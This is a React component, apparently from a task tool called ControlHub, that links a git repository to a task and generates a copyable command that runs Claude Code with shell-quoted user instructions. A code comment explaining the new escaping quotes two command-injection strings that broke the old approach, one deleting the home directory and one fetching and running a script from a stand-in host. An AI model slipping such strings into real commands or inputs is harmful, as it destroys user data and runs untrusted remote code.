'use client';

import { useCallback, useEffect, useState } from 'react';
import { useToast } from '@/components/ui/Toast';

interface TaskRepo {
  id: string;
  taskId: string;
  repoUrl: string;
  branch: string | null;
  localPath: string | null;
  defaultInstruction: string | null;
}

interface TaskRepoSectionProps {
  taskId: string;
  taskTitle: string;
  taskDescription?: string | null;
}

const inputStyle: React.CSSProperties = {
  background: 'rgba(42, 47, 53, 0.55)',
  border: '1px solid rgba(216, 204, 192,0.15)',
  borderRadius: '6px',
  padding: '0.4rem 0.6rem',
  color: 'var(--beige-light)',
  fontSize: '0.8125rem',
  width: '100%',
  boxSizing: 'border-box',
  fontFamily: 'inherit',
};

const buttonStyle: React.CSSProperties = {
  padding: '4px 10px',
  background: 'rgba(176, 122, 79,0.2)',
  border: '1px solid rgba(176, 122, 79,0.4)',
  color: 'var(--leather-light)',
  borderRadius: '4px',
  cursor: 'pointer',
  fontSize: '0.75rem',
};

/**
 * POSIX shell single-quote escaping. Inside '...' nothing is special except the
 * closing quote, which is emitted as '"'"' (close, literal quote, reopen).
 * This replaces the old `.replace(/"/g, '\\"')` approach, which escaped
 * double quotes but not backslashes or `$`, so input such as `\"; rm -rf ~ #`
 * or `$(curl evil.sh | sh)` could break out of the generated command.
 */
export function shellQuote(value: string): string {
  return `'${value.split("'").join(`'"'"'`)}'`;
}

function parseRepoSlug(url: string): string | null {
  const m = url.match(/github\.com[:/]([^/]+)\/([^/.]+)(?:\.git)?/);
  if (!m) return null;
  return `${m[1]}/${m[2]}`;
}

function buildClaudeCommand(
  repo: TaskRepo,
  taskTitle: string,
  instruction: string,
): string {
  const slug = parseRepoSlug(repo.repoUrl);
  const cloneDir = slug ? slug.split('/')[1] : 'repo';
  const target = repo.localPath
    ? `cd ${shellQuote(repo.localPath)} && git pull`
    : slug
    ? `gh repo clone ${shellQuote(slug)} && cd ${shellQuote(cloneDir)}`
    : `git clone ${shellQuote(repo.repoUrl)} && cd ${shellQuote(cloneDir)}`;

  const branchStep = repo.branch ? ` && git checkout ${shellQuote(repo.branch)}` : '';
  // JSON.stringify fully escapes quotes *and* backslashes in the title.
  const context = `Context: ControlHub task ${JSON.stringify(taskTitle)}`;
  const prompt = `${context}\n\nInstruction: ${instruction}\n\nWhen finished, commit with a clear message and push.`;
  // Single-quote the whole prompt so the shell performs no expansion
  // ($(...), `...`, $VAR, backslashes) on user-controlled task text.
  return `${target}${branchStep} && claude ${shellQuote(prompt)}`;
}

export function TaskRepoSection({ taskId, taskTitle, taskDescription }: TaskRepoSectionProps) {
  const toast = useToast();
  const [repo, setRepo] = useState<TaskRepo | null>(null);
  const [loading, setLoading] = useState(true);
  const [editing, setEditing] = useState(false);
  const [repoUrl, setRepoUrl] = useState('');
  const [branch, setBranch] = useState('');
  const [localPath, setLocalPath] = useState('');
  const [defaultInstruction, setDefaultInstruction] = useState('');
  const [instruction, setInstruction] = useState('');
  const [showCommand, setShowCommand] = useState(false);

  const load = useCallback(async () => {
    setLoading(true);
    try {
      const r = await fetch(`/api/tasks/${taskId}/repo`);
      const j = await r.json();
      setRepo(j.repo ?? null);
      if (j.repo?.defaultInstruction) setInstruction(j.repo.defaultInstruction);
    } finally {
      setLoading(false);
    }
  }, [taskId]);

  useEffect(() => {
    load();
  }, [load]);

  function beginEdit() {
    setRepoUrl(repo?.repoUrl ?? '');
    setBranch(repo?.branch ?? '');
    setLocalPath(repo?.localPath ?? '');
    setDefaultInstruction(repo?.defaultInstruction ?? '');
    setEditing(true);
  }

  async function save() {
    const trimmed = repoUrl.trim();
    if (!trimmed) {
      toast.error('Repo URL is required');
      return;
    }
    const r = await fetch(`/api/tasks/${taskId}/repo`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        repoUrl: trimmed,
        branch: branch.trim() || null,
        localPath: localPath.trim() || null,
        defaultInstruction: defaultInstruction.trim() || null,
      }),
    });
    if (!r.ok) {
      const j = await r.json().catch(() => ({}));
      toast.error(j.error ?? 'Failed to save repo');
      return;
    }
    setEditing(false);
    await load();
  }

  async function unlink() {
    if (!confirm('Unlink this repository from the task?')) return;
    await fetch(`/api/tasks/${taskId}/repo`, { method: 'DELETE' });
    setRepo(null);
    setInstruction('');
  }

  async function copyCommand() {
    if (!repo) return;
    const text = instruction.trim();
    if (!text) {
      toast.error('Write an instruction first');
      return;
    }
    const cmd = buildClaudeCommand(repo, taskTitle, text);
    try {
      await navigator.clipboard.writeText(cmd);
      toast.success('Command copied. Paste into your terminal.');
    } catch {
      setShowCommand(true);
    }
  }

  const effectiveInstruction = instruction || taskDescription || '';
  const slug = repo ? parseRepoSlug(repo.repoUrl) : null;

  return (
    <section
      style={{
        marginTop: '1.5rem',
        paddingTop: '1rem',
        borderTop: '1px solid rgba(216, 204, 192,0.1)',
      }}
    >
      <h2
        style={{
          fontSize: '0.75rem',
          fontWeight: 600,
          color: 'var(--leather-light)',
          textTransform: 'uppercase',
          letterSpacing: '0.08em',
          marginBottom: '0.5rem',
        }}
      >
        Repository
      </h2>

      {loading ? (
        <p style={{ color: 'var(--muted)', fontSize: '0.8125rem', margin: 0 }}>Loading…</p>
      ) : editing ? (
        <div style={{ display: 'grid', gap: '0.5rem' }}>
          <input
            type="text"
            value={repoUrl}
            onChange={(e) => setRepoUrl(e.target.value)}
            placeholder="git@github.com:user/repo.git or https://github.com/user/repo"
            style={inputStyle}
          />
          <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
            <input
              type="text"
              value={branch}
              onChange={(e) => setBranch(e.target.value)}
              placeholder="branch (optional)"
              style={{ ...inputStyle, flex: '0 1 180px' }}
            />
            <input
              type="text"
              value={localPath}
              onChange={(e) => setLocalPath(e.target.value)}
              placeholder="local path (optional, e.g. ~/Code/repo)"
              style={{ ...inputStyle, flex: '1 1 240px' }}
            />
          </div>
          <textarea
            value={defaultInstruction}
            onChange={(e) => setDefaultInstruction(e.target.value)}
            placeholder="Default instruction template (optional)"
            rows={2}
            style={{ ...inputStyle, resize: 'vertical' }}
          />
          <div style={{ display: 'flex', gap: '0.5rem' }}>
            <button onClick={save} style={buttonStyle}>Save</button>
            <button
              onClick={() => setEditing(false)}
              style={{ ...buttonStyle, background: 'transparent' }}
            >
              Cancel
            </button>
          </div>
        </div>
      ) : !repo ? (
        <div>
          <p style={{ color: 'var(--muted)', fontSize: '0.8125rem', margin: '0 0 0.5rem' }}>
            No repository linked. Link one to generate a Claude Code command for this task.
          </p>
          <button onClick={beginEdit} style={buttonStyle}>
            + Link repository
          </button>
        </div>
      ) : (
        <div style={{ display: 'grid', gap: '0.5rem' }}>
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem',
              padding: '0.5rem 0.625rem',
              background: 'rgba(42, 47, 53, 0.50)',
              border: '1px solid rgba(216, 204, 192,0.1)',
              borderRadius: 'var(--radius-sm)',
              fontSize: '0.8125rem',
            }}
          >
            <span style={{ color: 'var(--beige-light)', fontFamily: 'var(--font-mono, monospace)' }}>
              {slug ?? repo.repoUrl}
            </span>
            {repo.branch && (
              <span style={{ color: 'var(--muted)', fontSize: '0.6875rem' }}>@ {repo.branch}</span>
            )}
            <div style={{ marginLeft: 'auto', display: 'flex', gap: '0.375rem' }}>
              <button
                onClick={beginEdit}
                style={{ ...buttonStyle, fontSize: '0.6875rem' }}
              >
                Edit
              </button>
              <button
                onClick={unlink}
                style={{ ...buttonStyle, fontSize: '0.6875rem', background: 'transparent' }}
              >
                Unlink
              </button>
            </div>
          </div>

          <textarea
            value={instruction}
            onChange={(e) => setInstruction(e.target.value)}
            placeholder={
              taskDescription
                ? "Instruction (leave blank to use the task description)"
                : "What should Claude do in this repo?"
            }
            rows={3}
            style={{ ...inputStyle, resize: 'vertical' }}
          />

          <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center', flexWrap: 'wrap' }}>
            <button
              onClick={copyCommand}
              style={buttonStyle}
              disabled={!effectiveInstruction.trim()}
            >
              Copy Claude command
            </button>
            <button
              onClick={() => setShowCommand((s) => !s)}
              style={{ ...buttonStyle, background: 'transparent', fontSize: '0.6875rem' }}
            >
              {showCommand ? 'Hide' : 'Show'} command
            </button>
            <span style={{ fontSize: '0.6875rem', color: 'var(--muted)' }}>
              Paste in the terminal on any machine with Claude Code + git auth.
            </span>
          </div>

          {showCommand && effectiveInstruction.trim() && (
            <pre
              style={{
                margin: 0,
                padding: '0.625rem 0.75rem',
                background: 'rgba(34, 38, 43, 0.60)',
                border: '1px solid rgba(216, 204, 192,0.1)',
                borderRadius: 'var(--radius-sm)',
                fontSize: '0.6875rem',
                color: 'var(--beige-light)',
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
                fontFamily: 'var(--font-mono, monospace)',
              }}
            >
              {buildClaudeCommand(repo, taskTitle, effectiveInstruction)}
            </pre>
          )}
        </div>
      )}
    </section>
  );
}
